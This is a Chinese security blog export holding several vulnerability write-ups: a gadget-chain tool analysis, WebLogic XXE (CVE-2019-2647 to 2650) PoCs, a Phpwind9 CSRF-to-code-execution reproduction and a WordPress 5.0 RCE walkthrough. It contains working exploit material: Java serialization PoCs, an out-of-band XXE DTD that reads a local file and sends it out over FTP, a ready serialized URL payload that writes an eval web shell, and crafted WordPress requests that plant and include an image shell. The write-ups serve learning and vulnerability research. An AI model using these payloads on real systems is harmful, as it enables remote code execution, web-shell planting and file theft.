可以看到IFn的子类中只有FnConstant的invokeCall在passthrough数据流中，因为其他几个在静态分析中无法判断返回值与参数的关系。同时TestDemo的cMethod与pMethod都在passthrough数据流中，这也说明了拓扑排序那一步的必要性和正确性。 Step3 枚举passthrough调用图callgraph.dat: Step4 搜索可用的sourcesources.dat: Step5 搜索生成调用链在gadget-chains.txt中找到了如下链： 123com/demo/model/AbstractTableModel.hashCode()I (0) com/demo/ifn/FnEval.invokeCall(Ljava/lang/Object;)Ljava/lang/Object; (1) java/lang/Runtime.exec(Ljava/lang/String;)Ljava/lang/Process; (1) 可以看到选择的确实是找了一条最短的路径，并没有经过FnCompose、FnConstant路径。 环路造成路径爆炸上面流程分析第五步中说到，如果去掉已访问过节点的判断会怎么样呢，能不能生成经过FnCompose、FnConstant的调用链呢？ 陷入了爆炸状态，Search space无限增加，其中必定存在环路。作者使用的策略是访问过的节点就不再访问了，这样解决的环路问题，但是丢失了其他链。 比如上面的FnCompose类： 123456public class Fncompose implements IFn&#123; private IFn f1,f2; public Object invoke(Object arg)&#123; return f2.invoke(f1.invoke(arg)); &#125;&#125; 由于IFn是接口，所以在调用链生成中会查找是它的子类，假如f1,f2都是FnCompose类的对象，这样形成了环路。 隐式调用测试隐式调用看工具能否发现，将FnEval.java做一些修改： 123456789101112131415161718192021222324252627FnEval.java package com.demo.ifn; import java.io.IOException; import java.io.Serializable; public class FnEval implements IFn, Serializable &#123; private String cmd; public FnEval() &#123; &#125; @Override public String toString() &#123; try &#123; Runtime.getRuntime().exec(this.cmd); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return "FnEval&#123;&#125;"; &#125; public Object invokeCall(Object arg) throws IOException &#123; this.cmd = (String) arg; return this + " test"; &#125; &#125; 结果： 123456com/demo/model/AbstractTableModel.hashCode()I (0) com/demo/ifn/FnEval.invokeCall(Ljava/lang/Object;)Ljava/lang/Object; (0) java/lang/StringBuilder.append(Ljava/lang/Object;)Ljava/lang/StringBuilder; (1) java/lang/String.valueOf(Ljava/lang/Object;)Ljava/lang/String; (0) com/demo/ifn/FnEval.toString()Ljava/lang/String; (0) java/lang/Runtime.exec(Ljava/lang/String;)Ljava/lang/Process; (1) 隐式调用了tostring方法，说明在字节码分析中做了查找隐式调用这一步。 不遵循反射调用在github的工具说明中，作者也说到了在静态分析中这个工具的盲点，像下面这中FnEval.class.getMethod(&quot;exec&quot;, String.class).invoke(null, arg)写法是不遵循反射调用的，将FnEval.java修改： 1234567891011121314151617181920212223242526272829FnEval.java package com.demo.ifn;import java.io.IOException;import java.io.Serializable;import java.lang.reflect.InvocationTargetException;public class FnEval implements IFn, Serializable &#123; public FnEval() &#123; &#125; public static void exec(String arg) throws IOException &#123; Runtime.getRuntime().exec(arg); &#125; public Object invokeCall(Object arg) throws IOException &#123; try &#123; return FnEval.class.getMethod("exec", String.class).invoke(null, arg); &#125; catch (NoSuchMethodException e) &#123; e.printStackTrace(); &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; catch (InvocationTargetException e) &#123; e.printStackTrace(); &#125; return null; &#125;&#125; 经过测试，确实没有发现。但是将FnEval.class.getMethod(&quot;exec&quot;, String.class).invoke(null, arg)改为this.getClass().getMethod(&quot;exec&quot;, String.class).invoke(null, arg)这种写法却是可以发现的。 特殊语法测试一下比较特殊的语法呢，比如lambda语法？将FnEval.java做一些修改： 12345678910111213141516171819202122FnEval.java: package com.demo.ifn; import java.io.IOException; import java.io.Serializable; public class FnEval implements IFn, Serializable &#123; public FnEval() &#123; &#125; interface ExecCmd &#123; public Object exec(String cmd) throws IOException; &#125; public Object invokeCall(Object arg) throws IOException &#123; ExecCmd execCmd = cmd -&gt; &#123; return Runtime.getRuntime().exec(cmd); &#125;; return execCmd.exec((String) arg); &#125; &#125; 经过测试，没有检测到这条利用链。说明目前语法分析那一块还没有对特殊语法分析。 匿名内部类测试匿名内部类，将FnEval.java做一些修改： 12345678910111213141516171819202122232425262728FnEval.java: package com.demo.ifn; import java.io.IOException; import java.io.Serializable; public class FnEval implements IFn, Serializable &#123; public FnEval() &#123; &#125; interface ExecCmd &#123; public Object exec(String cmd) throws IOException; &#125; public Object callExec(ExecCmd execCmd, String cmd) throws IOException &#123; return execCmd.exec(cmd); &#125; public Object invokeCall(Object arg) throws IOException &#123; return callExec(new ExecCmd() &#123; @Override public Object exec(String cmd) throws IOException &#123; return Runtime.getRuntime().exec(cmd); &#125; &#125;, (String) arg); &#125; &#125; 经过测试，没有检测到这条利用链。说明目前语法分析那一块还没有对匿名内部类的分析。 sink-&gt;source?既然能source-&gt;sink，那么能不能sink-&gt;source呢？因为搜索source-&gt;sink时，source和sink都是已知的，如果搜索sink-&gt;source时，sink与soure也是已知的，那么source-&gt;sink与sink-&gt;source好像没有什么区别？如果能将source总结为参数可控的一类特征，那么sink-&gt;source这种方式是一种非常好的方式，不仅能用在反序列化漏洞中，还能用在其他漏洞中（例如模板注入）。但是这里也还有一些问题，比如反序列化是将this以及类的属性都当作了0参，因为反序列化时这些都是可控的，但是在其他漏洞中这些就不一定可控了。 目前还不知道具体如何实现以及会有哪些问题，暂时先不写。 缺陷目前还没有做过大量测试，只是从宏观层面分析了这个工具的大致原理。结合平安集团分析文章以及上面的测试目前可以总结出一下几个缺点（不止这些缺陷）： callgraph生成不完整 调用链搜索结果不完整，这是由于查找策略导致的 一些特殊语法、匿名内部类还不支持 … 设想与改进 对以上几个缺陷进行改进 结合已知的利用链(如ysoserial等)不断测试 尽可能列出所有链并结合人工筛选判断，而作者使用的策略是只要经过这个节点有一条链，其他链经过这个节点时就不再继续寻找下去。主要解决的就是最后那个调用链环路问题，目前看到几种方式： DFS+最大深度限制 继续使用BFS，人工检查生成的调用链，把无效的callgraph去掉，重复运行 调用链缓存（这一个暂时还没明白具体怎么解决环路的，只是看到了这个方法） 我的想法是在每条链中维持一个黑名单，每次都检查是否出现了环路，如果在这条链中出现了环路，将造成环路的节点加入黑名单，继续使其走下去。当然虽然没有了环，也能会出现路径无限增长的情况，所以还是需要加入路径长度限制。 尝试sink-&gt;source的实现 多线程同时搜索多条利用链加快速度 … 最后在原理分析的时候，忽略了字节码分析的细节，有的地方只是暂时猜测与测试得出的结果，所以可能存在一些错误。字节码分析那一块是很重要的一环，它对污点的判断、污点的传递调用等起着很重要的作用，如果这些部分出现了问题，整个搜索过程就会出现问题。由于ASM框架对使用人员要求较高，所以需要要掌握JVM相关的知识才能较好使用ASM框架，所以接下来的就是开始学习JVM相关的东西。这篇文章只是从宏观层面分析这个工具的原理，也算是给自己增加些信心，至少明白这个工具不是无法理解和无法改进的，同时后面再接触这个工具进行改进时也会间隔一段时间，回顾起来也方便，其他人如果对这个工具感兴趣也可以参考。等以后熟悉并能操纵Java字节码了，在回头来更新这篇文章并改正可能有错误的地方。 如果这些设想与改进真的实现并且进行了验证，那么这个工具真的是一个得力帮手。但是这些东西要实现还有较长的一段路要走，还没开始实现就预想到了那么多问题，在实现的时候会遇到更多问题。不过好在有一个大致的方向了，接下来就是对各个环节逐一解决了。 参考 https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf https://www.youtube.com/watch?v=wPbW6zQ52w8 https://mp.weixin.qq.com/s/RD90-78I7wRogdYdsB-UOg]]></content>
  </entry>
  <entry>
    <title><![CDATA[WebLogic CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650 XXE漏洞分析]]></title>
    <url>%2FWebLogic%20CVE-2019-2647%E3%80%81CVE-2019-2648%E3%80%81CVE-2019-2649%E3%80%81CVE-2019-2650%20XXE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</url>
    <content type="text"><![CDATA[当你觉得很累的时候，说明你正在走上坡路。 @xxlegend在他的博客分析了其中的一个XXE漏洞点，并给出了PoC，作为入门级的Java新手，在大佬分析的基础上再分析很适合学习Java漏洞 Oracle发布了4月份的补丁，详情见链接(https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html#AppendixFMW @xxlegend在他的博客分析了其中的一个XXE漏洞点，并给出了PoC。刚入手java不久，本着学习的目的，自己尝试分析了其他几个点的XXE并构造了PoC。下面的分析我尽量描述自己思考以及PoC构造过程，新手真的会踩很多莫名其妙的坑。感谢在复现与分析过程中为我提供帮助的小伙伴@Badcode，没有他的帮助我可能环境搭起来都会花费一大半时间。 补丁分析，找到漏洞点根据JAVA常见XXE写法与防御方式(参考https://blog.spoock.com/2018/10/23/java-xxe/)，通过对比补丁，发现新补丁以下四处进行了setFeature操作: 应该就是对应的四个CVE了，其中ForeignRecoveryContext@xxlegend大佬已经分析过了，这里就不再分析了，下面主要是分析下其他三个点 分析环境 Windows 10 WebLogic 10.3.6.0 Jdk160_29（WebLogic 10.3.6.0自带的JDK） WsrmServerPayloadContext 漏洞点分析WsrmServerPayloadContext修复后的代码如下: 12345678910111213141516171819202122232425262728293031323334package weblogic.wsee.reliability;import ...public class WsrmServerPayloadContext extends WsrmPayloadContext &#123; public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException &#123; ... &#125; private EndpointReference readEndpt(ObjectInput var1, int var2) throws IOException, ClassNotFoundException &#123; ... ByteArrayInputStream var15 = new ByteArrayInputStream(var3); try &#123; DocumentBuilderFactory var7 = DocumentBuilderFactory.newInstance(); try &#123; String var8 = "http://xml.org/sax/features/external-general-entities"; var7.setFeature(var8, false); var8 = "http://xml.org/sax/features/external-parameter-entities"; var7.setFeature(var8, false); var8 = "http://apache.org/xml/features/nonvalidating/load-external-dtd"; var7.setFeature(var8, false); var7.setXIncludeAware(false); var7.setExpandEntityReferences(false); &#125; catch (Exception var11) &#123; if (verbose) &#123; Verbose.log("Failed to set factory:" + var11); &#125; &#125; ... &#125;&#125; 可以看到进行了setFeature操作防止xxe攻击，而未打补丁之前是没有进行setFeature操作的 readExternal在反序列化对象时会被调用，与之对应的writeExternal在序列化对象时会被调用，看下writeExternal的逻辑: var1就是this.formENdpt，注意var5.serialize可以传入三种类型的对象，var1.getEndptElement()返回的是Element对象，先尝试新建一个项目构造一下PoC: 结构如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class images/weblogic-xxe1 &#123; public static void main(String[] args) throws IOException &#123; Object instance = getXXEObject(); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("xxe")); out.writeObject(instance); out.flush(); out.close(); &#125; public static class MyEndpointReference extends EndpointReference &#123; @Override public Element getEndptElement() &#123; super.getEndptElement(); Document doc = null; Element element = null; try &#123; DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance(); //从DOM工厂中获得DOM解析器 DocumentBuilder dbBuilder = dbFactory.newDocumentBuilder(); //创建文档树模型对象 doc = dbBuilder.parse("test.xml"); element = doc.getDocumentElement(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return element; &#125; &#125; public static Object getXXEObject() &#123; EndpointReference fromEndpt = (EndpointReference) new MyEndpointReference(); EndpointReference faultToEndpt = null; WsrmServerPayloadContext wspc = new WsrmServerPayloadContext(); try &#123; Field f1 = wspc.getClass().getDeclaredField("fromEndpt"); f1.setAccessible(true); f1.set(wspc, fromEndpt); Field f2 = wspc.getClass().getDeclaredField("faultToEndpt"); f2.setAccessible(true); f2.set(wspc, faultToEndpt); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return wspc; &#125;&#125; test.xml内容如下，my.dtd暂时为空就行，先测试能否接收到请求: 12345&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE data SYSTEM "http://127.0.0.1:8000/my.dtd" [ &lt;!ELEMENT data (#PCDATA)&gt; ]&gt;&lt;data&gt;4&lt;/data&gt; 运行PoC，生成的反序列化数据xxe，使用十六进制查看器打开: 发现DOCTYPE无法被引入 我尝试了下面几种方法： 在上面说到var5.serialize可以传入Document对象，测试了下，的确可以，但是如何使getEndptElement返回一个Document对象呢？ 尝试了自己创建一个EndpointReference类，修改getEndptElement返回对象，内容和原始内容一样，但是在反序列化时找不到我创建的类，原因是自己建的类package与原来的不同，所以失败了 尝试像Python那样动态替换一个类的方法，貌似Java好像做不到… 尝试了一个暴力的方法，替换Jar包中的类。首先复制出Weblogic的modules文件夹与wlserver_10.3\server\lib文件夹到另一个目录，将wlserver_10.3\server\lib\weblogic.jar解压，将WsrmServerPayloadContext.class类删除，重新压缩为weblogic.Jar，然后新建一个项目，引入需要的Jar文件（modules和wlserver_10.3\server\lib中所有的Jar包），然后新建一个与WsrmServerPayloadContext.class同样的包名，在其中新建WsrmServerPayloadContext.class类，复制原来的内容进行修改(修改只是为了生成能触发xml解析的数据，对readExternal反序列化没有影响)。 WsrmServerPayloadContext.class修改的内容如下: 经过测试第二种方式是可行的，但是好像过程略复杂。然后尝试了下新建一个与原始WsrmServerPayloadContext.class类同样的包名，然后进行修改，修改内容与第二种方式一样 测试这种方式也是可行的，比第二种方式操作起来方便些 构造新的PoC: 123456789101112131415161718192021222324252627282930public class images/weblogic-xxe1 &#123; public static void main(String[] args) throws IOException &#123; Object instance = getXXEObject(); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("xxe")); out.writeObject(instance); out.flush(); out.close(); &#125; public static Object getXXEObject() &#123; EndpointReference fromEndpt = new EndpointReference(); EndpointReference faultToEndpt = null; WsrmServerPayloadContext wspc = new WsrmServerPayloadContext(); try &#123; Field f1 = wspc.getClass().getDeclaredField("fromEndpt"); f1.setAccessible(true); f1.set(wspc, fromEndpt); Field f2 = wspc.getClass().getDeclaredField("faultToEndpt"); f2.setAccessible(true); f2.set(wspc, faultToEndpt); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return wspc; &#125;&#125; 查看下新生成的xxe十六进制: DOCTYPE被写入了 测试下，使用T3协议脚本向WebLogic 7001端口发送序列化数据: 漂亮，接收到请求了，接下来就是尝试下到底能不能读取到文件了 构造的test.xml如下: 12345678&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM "file:///C:Users/dell/Desktop/test.txt"&gt; &lt;!ENTITY % dtd SYSTEM "http://127.0.0.1:8000/my.dtd"&gt; %dtd; %send; ]&gt;&lt;ANY&gt;xxe&lt;/ANY&gt; my.dtd如下(my.dtd在使用PoC生成反序列化数据的时候先清空，然后，不然在dbBuilder.parse时会报错无法生成正常的反序列化数据，至于为什么，只有自己测试下才会明白): 1234&lt;!ENTITY % all"&lt;!ENTITY &amp;#x25; send SYSTEM 'ftp://127.0.0.1:2121/%file;'&gt;"&gt;%all; 运行PoC生成反序列化数据，测下发现请求都接收不到了…，好吧，查看下十六进制: %dtd;%send;居然不见了…，可能是因为DOM解析器的原因，my.dtd内容为空，数据没有被引用。 尝试debug看下: 可以看到%dtd;%send;确实是被处理掉了 测试下正常的加载外部数据，my.dtd改为如下: 1234&lt;!ENTITY % all"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://127.0.0.1:8000/gen.xml'&gt;"&gt;%all; gen.xml为: 1&lt;?xml version="1.0" encoding="UTF-8"?&gt; debug看下: 可以看到%dtd;%send;被my.dtd里面的内容替换了。debug大致看了xml解析过程，中间有一个EntityScanner，会检测xml中的ENTITY，并且会判断是否加载了外部资源，如果加载了就外部资源加载进来，后面会将实体引用替换为实体申明的内容。也就是说，我们构造的反序列化数据中的xml数据，已经被解析过一次了，而需要的是没有被解析过的数据，让目标去解析。 所以我尝试修改了十六进制如下，使得xml修改成没有被解析的形式: 运行PoC测试下， 居然成功了，一开始以为反序列化生成的xml数据那块还会进行校验，不然反序列化不了，直接修改数据是不行的，没想到直接修改就可以了 UnknownMsgHeader 漏洞点分析与WsrmServerPayloadContext差不多，PoC构造也是新建包然后替换，就不详细分析了，只说下类修改的地方与PoC构造 新建UnknownMsgHeader类，修改writeExternal PoC如下: 1234567891011121314151617181920212223242526272829public class images/weblogic-xxe2 &#123; public static void main(String[] args) throws IOException &#123; Object instance = getXXEObject(); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("xxe")); out.writeObject(instance); out.flush(); out.close(); &#125; public static Object getXXEObject() &#123; QName qname = new QName("a", "b", "c"); Element xmlHeader = null; UnknownMsgHeader umh = new UnknownMsgHeader(); try &#123; Field f1 = umh.getClass().getDeclaredField("qname"); f1.setAccessible(true); f1.set(umh, qname); Field f2 = umh.getClass().getDeclaredField("xmlHeader"); f2.setAccessible(true); f2.set(umh, xmlHeader); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return umh; &#125;&#125; 运行PoC测试下(生成的步骤与第一个漏洞点一样)，使用T3协议脚本向WebLogic 7001端口发送序列化数据: WsrmSequenceContext 漏洞点分析这个类看似需要构造的东西挺多的，readExternal与writeExternal的逻辑也比前两个复杂些，但是PoC构造也很容易 新建WsrmSequenceContext类，修改 PoC如下: 1234567891011121314151617181920212223242526public class images/weblogic-xxe3 &#123; public static void main(String[] args) throws IOException &#123; Object instance = getXXEObject(); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("xxe")); out.writeObject(instance); out.flush(); out.close(); &#125; public static Object getXXEObject() &#123; EndpointReference acksTo = new EndpointReference(); WsrmSequenceContext wsc = new WsrmSequenceContext(); try &#123; Field f1 = wsc.getClass().getDeclaredField("acksTo"); f1.setAccessible(true); f1.set(wsc, acksTo); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return wsc; &#125;&#125; 测试下，使用T3协议脚本向WebLogic 7001端口发送序列化数据: 最后好了，分析完成了。第一次分析Java的漏洞，还有很多不足的地方，但是分析的过程中也学到了很多，就算是一个看似很简单的点，如果不熟悉Java的一特性，会花费较长的时间去折腾。所以，一步一步走吧，不要太急躁，还有很多东西要学。]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Phpwind9-GET型CSRF任意代码执行漏洞复现与分析]]></title>
    <url>%2FPhpwind9-GET%E5%9E%8BCSRF%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90.html</url>
    <content type="text"><![CDATA[总有一段路,需要一个人走,那就一个人,勇敢的走完 学习wooyun1000个代码审计案例,看到很有技巧性的漏洞跟踪学习下 漏洞复现复现环境 Windows10 php5.6 phpwind9.0 漏洞要求 系统为windows 需要有访问后台任务中心权限 复现过程 step1 生成反序列化poc 123456789101112131415161718192021222324252627282930&lt;?php// test.phpheader("Content-Type: text/plain");require_once "test2.php";class PwDelayRun&#123; private $_callback; private $_args; function __construct() &#123; $this-&gt;_callback = [ 'assert' ]; $this-&gt;_args = [ ["phpinfo() &amp;&amp; file_put_contents('shell.php','&lt;?php eval(\$_REQUEST[233]); ?&gt;');"] ]; &#125;&#125;$obj = new stdClass();$obj-&gt;a = new src\library\utility\PwDelayRun();$obj-&gt;b = new PwDelayRun();echo serialize($obj);echo "\n";echo urlencode(serialize($obj));?&gt;&lt;?php//test2.phpnamespace src\library\utility;class PwDelayRun&#123;&#125;?&gt; step2 使用admin账户登陆,然后请求http://127.0.0.1/phpwind9.0/admin.php?m=task&amp;c=TaskConditionMember&amp;a=profile&amp;var=O%3A8%3A%22stdClass%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A30%3A%22src%5Clibrary%5Cutility%5CPwDelayRun%22%3A0%3A%7B%7Ds%3A1%3A%22b%22%3BO%3A10%3A%22PwDelayRun%22%3A2%3A%7Bs%3A21%3A%22%00PwDelayRun%00_callback%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22assert%22%3B%7Ds%3A17%3A%22%00PwDelayRun%00_args%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A1%3A%7Bi%3A0%3Bs%3A79%3A%22phpinfo%28%29%3Bfile_put_contents%28%27shell.php%27%2C%27%3C%3Fphp+eval%28%24_REQUEST%5B233%5D%29%3B+%3F%3E%27%29%3Bexit%3B%22%3B%7D%7D%7D%7D 代码成功执行 shell成功写入 漏洞分析全局搜索找到反序列化位置漏洞位置一共三处: 123/src/applications/admin/TaskConditionBbsController.php/src/applications/admin/TaskConditionMemberController.php/src/applications/admin/TaskRewardController.php 这里使用/src/applications/admin/TaskConditionMemberController.php $var = unserialize($this-&gt;getInput(&#39;var&#39;));,从Input中获取var参数的值,进行反序列化。 这个Input可以来自get/post/cookie。只要在phpwind里找到反序列化可以利用的点,就能在这里触发反序列化漏洞。 全局搜索_destruct可以找到一个PwDelayRun类,其中遍历了_callback数组,用call_user_func_array执行任意函数。这里如果_callback可控,那么就可以直接执行assert+任意代码了。在/src/applications/admin/TaskConditionMemberController.php中,输入可以控制PwDelayRun类的序列化字符串,但是在执行反序列话之前必须定义了PwDelayRun类(也就是在此之前要包含过PwDelayRun所在的文件) 在TaskConditionMemberController::beforeAction::unserialize处下端点,并在之前输出当前所定义的所有类 访问连接http://127.0.0.1/phpwind9.0/admin.php?m=task&amp;c=TaskConditionMember&amp;a=profile&amp;var= 可以看到在此之前没有定义过PwDelayRun类,那么即使反序列化也不会调用相关方法 spl_autoload包含任意php文件为了包含PwDelayRun类,作者提到了使用spl_autoloa方法,就是说如果要使用的类不存在,会调用框架自己注册的autoload方法加载类。在phpwind9中,实现了autoload方法,并注册了 但是这里className没有路径,PwDelayRun类在src/library/utility/PwDelayRun.php文件中,需要传入路径才可以包含到这个类。 虽然类名不能包含特殊字符,但类名中是可以包含\的,这是php中空间命名。命名空间中可以包含\,而在windows下,\也可以作为路径的分隔符,因此可以在payload中使用命名空间生成序列化字符串,在phpwind9中找不到类的时候,就会使用include包含。而包含时\只能在windows上使用,所以只限于windows系统。 但是,这里将类名设置为src\library\utility\PwDelayRun,而 整个phpwind全局是没有使用命名空间的,也就是默认命名空间为\,但现在的PwDelayRun类所在的命名空间为src\library\utility。 这样,即使我包含了src\library\utility\PwDelayRun.php文件,反序列化的时候是实例化的src\library\utility\PwDelayRun类。但phpwind的命名空间是\,上下文存在的类是\PwDelayRun类,还是无法正常进行(得到的是一个不完整的类__php_incomplete_class,这是因为php反序列化一个对象,PHP无法找到原始类,所以PHP不知道,这个类是怎么样的): 只要生成src\library\utility\PwDelayRun类和\PwDelayRun类两个对象,放在一个数组中,在反序列化前者的过程中include目标文件,在反序列化后者的过程中拿到PwDelayRun对象 利用数组+命名空间加载相同名字的类生成src\library\utility\PwDelayRun类和\PwDelayRun类两个对象,放在一个数组中,在反序列化前者的过程中include目标文件,在反序列化后者的过程中拿到PwDelayRun对象。但是有个数组判断, 这里如果反序列化后是个数组,就会保存到output中,导致变量不会在beforeAction结束时销毁,而是在脚本束时销毁。如果在结束时销毁,由于没有了上下文,poc中写文件那一步是写不进去的,除非文件路径给绝对给绝对路径,自己可以测试下。作者在分析中给了一个方法,就是用其他对象来替代数组,比如stdClass, 所以最后得到如下poc: 12345678910111213141516171819202122232425262728&lt;?php// test1.phpheader("Content-Type: text/plain");require_once "test2.php";class PwDelayRun&#123; private $_callback; private $_args; function __construct() &#123; $this-&gt;_callback = [ 'assert' ]; $this-&gt;_args = [ ["phpinfo() &amp;&amp; file_put_contents('shell.php','&lt;?php eval(\$_REQUEST[233]); ?&gt;')"] ]; &#125;&#125;$obj = new stdClass();$obj-&gt;a = new src\library\utility\PwDelayRun();$obj-&gt;b = new PwDelayRun();echo urlencode(serialize($obj));?&gt;&lt;?php//test2.phpnamespace src\library\utility;class PwDelayRun&#123;&#125;?&gt; csrf由于上面的代码执行链接是get请求,不需要post中的csrftoken或其他验证,所以可以写个帖子,插入恶意链接,等待管理员点击。但是帖子中把&amp;编码了,导致请求不正常,不过可以增加一步跳转 总结这个漏洞很犀利和巧妙,所以自己跟踪与学习了下,加强自己的代码审计与分析能力,还有学到一些新技能： 可以调用get_declared_classes查看当前执行所加载的所有自定义类 反序列化时,如果反序列化点之前没有加载过要反序列化的类,spl_autoload可能会很有帮助,查看框架是否使用了autoload 反序列化时,可以使用一种对象替代另一种对象绕过某些判断(比如用stdClass替代array)]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wordpress-5.0-rce-漏洞复现(从环境搭建到代码执行)]]></title>
    <url>%2Fwordpress-5.0-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(%E4%BB%8E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%88%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C).html</url>
    <content type="text"><![CDATA[当你觉得很累的时候，说明你正在走上坡路。 看了网上大佬们的分析，作为代码审计入门级别的我，看大佬分析都很吃力，很多地方看得稀里糊涂…所以决定动手跟踪下，看下到底怎么触发漏洞，也学习下大佬们的思路，积累些经验。参考了seebug paper seebugpaper与绿盟的分析nsfocusblog 前言看了网上大佬们的分析，作为代码审计入门级别的我，看大佬分析都很吃力，很多地方看得稀里糊涂…所以决定动手跟踪下，看下到底怎么触发漏洞，也学习下大佬们的思路，积累些经验。参考了seebug paper seebugpaper与绿盟的分析nsfocusblog 环境 windows 10 phpstudy (php-7.0.12-nts+Apache) wordpress 5.0.0 （注： 官网的影响版本被修复了，自己去其他地方下载） ImageMagick-6.9.3-Q16 准备 step1 查看phpinfo参数 这几个参数和step2中ImageMagick和php-imagick扩展版本必须对应 step2 下载对应ImageMagick和php-imagick扩展 php-imagick扩展下载：php-imagick 比如我的是windows，php7.0 nts，vc14，x86，non safety，那么我选择如下 将下载的扩展包下的 将红色部分放到php安装目录（有php.ini）下，黄色部分放到安装目录的ext目录下 在php.ini中添加imagick扩展 修改配置后重启查看phpinfo 去imagemagick官网下载对应版本如上图我应该下载ImageMagick 6.9.3-7 Q16 x86，下载之后配置环境变量，配置好了可以使用convert命令查看是否安装好 step3 测试php-imagick能否正常工作与能不能远程加载图片 1234&lt;?php$image = new Imagick();$image-&gt;readImage('http://bpic.588ku.com/element_origin_min_pic/19/03/01/5011d5b976536a8e0807d11da668db43.jpg');?&gt; 如果不能远程加载，那么修改下wordpress的wp-includes/class-wp-image-editor-imagick.php的153行: step4 wordpress安装 wordpress安装就不说了，一路点击安装 安装完成后，使用管理员登陆，创建一个具有author权限的用户（利用此漏洞最低权限为author） 漏洞利用链 通过post meta变量覆盖，将数据库中的图片的_wp_attached_file变量覆盖，这一步是为下一步写入图片马到目录做铺垫 通过图片裁剪功能，将裁剪后的图片写到我们设定的目录下 通过post meta变量覆盖，设置_wp_page_template，指定template为图片马 在模板加载时包含恶意裁剪的图片马 漏洞复现 step1 制作一张图片马 我使用的MagickEXIF修改器MagickEXIF修改图片的exif信息制作的图片马 使用方式是直接拖进MagickEXIF，修改图片exif信息就可以了 step2 覆盖_wp_attached_file变量 上传setp1制作的图片马 此时查看wordpress数据库的wp_postmeta表，_wp_attached_file默认是图片上传所在路径（即wp-content/uploads/2019/03） 编辑图片信息并抓包 抓包 在repeater中修改包，添加如下内容： 1&amp;meta_input[_wp_attached_file]=2019/03/3-1.jpg#/../../../../themes/twentynineteen/shell.jpg 注意#前半部分setp1图片上传所在路径，后半部分可以任意。使用repeater重新发包记得删掉content-length 查看wp_postmeta表，_wp_attached_file已经被覆盖 step3 裁剪图片，将裁剪后的图片写到任意目录下（我上面的路径为wp-content/themes/twentynineteen/shell.jpg） 抓包 在repeater中，将post数据修改为如下（记得删除content-length，数据包中的_ajax_nonce为你数据包中的nonce，id你数据包 中的postid）: 1action=crop-image&amp;_ajax_nonce=e6c1b51c5b&amp;id=22&amp;cropDetails[x1]=10&amp;cropDetails[y1]=10&amp;cropDetails[width]=500&amp;cropDetails[height]=750&amp;cropDetails[dst_width]=100&amp;cropDetails[dst_height]=100 查看下文件exif信息，恶意代码还保留着 step4 覆盖_wp_page_template变量 再上传一个txt文件，和前面上传图片一样 修改文件信息并抓包改包 数据包中添加（图片为刚裁剪后的图片） 1&amp;meta_input[_wp_page_template]=cropped-shell-e1551529756623.jpg 查看数据库,_wp_page_template被覆盖为了我们指定的值 step5 包含图片马 查看text.txt的附件信息，图片马被包含 ​ 分析_wp_attached_file变量覆盖进入编辑 进入更新post data 进入wp_insert_attachment 进入wp_insert_post 最后到更新_wp_attached_file这里，可以看到我们自己传递的数据经过一系列复杂的操作及过滤依然没有变 裁剪图片，将裁剪后的图片写到任意目录下进入do_action处理，然后进入到wp_ajax_crop_image 进入wp_crop_image，可以看到取出了attachment_file，就是我们开始覆盖的值 创建上传文件夹，这里根据当前日期创建了2019/03文件夹 接着调用editor（这里是imagick）save方法将裁减的内容保存到dst_file，也就将裁剪后的图片马保存了我们设置的地方 _wp_page_template覆盖这一步和__wp_attached_file覆盖一样，至于如何找到的要覆盖这个变量，应该需要熟悉wordpress和足够的审计经验。我这种小白是不知道大佬如何找的… 包含裁剪图片马根据网上的一些分析，函数get_page_template和get_single_template这两个在函数中调 用了get_page_template_slug函数，而get_page_template_slug又从数据库获取了_wp_page_template， 只需要找到调用了get_page_template或get_single_template的地方，模板就能被包含 在上面复现的步骤中，我们点击了查看附件，会进入 进入get_single_template，可以看到模板被复赋值为图片马 图片马被包含 相关链接 imagick-dll imagemagick magickexif seebugpaper nsfocusblog]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[requests redirect bug]]></title>
    <url>%2Frequests%20redirect%20bug.html</url>
